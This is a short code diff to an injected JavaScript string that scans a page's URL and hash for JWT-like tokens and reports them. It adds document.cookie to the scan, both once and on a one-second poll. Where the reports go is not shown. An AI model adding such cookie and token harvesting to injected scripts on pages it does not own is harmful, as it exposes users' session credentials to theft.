@@ -36,6 +36,7 @@ const INJECTED_JS = `
   try {
     reportJwtCandidate(window.location.href, 'location_href');
     reportJwtCandidate(window.location.hash, 'location_hash');
+    reportJwtCandidate(document.cookie, 'document_cookie');
   } catch (e) {}
 
   try {
@@ -162,6 +163,7 @@ const INJECTED_JS = `
     setInterval(function () {
       reportJwtCandidate(window.location.href, 'location_poll');
       reportJwtCandidate(window.location.hash, 'hash_poll');
+      reportJwtCandidate(document.cookie, 'document_cookie_poll');
     }, 1000);
   } catch (e) {}
 
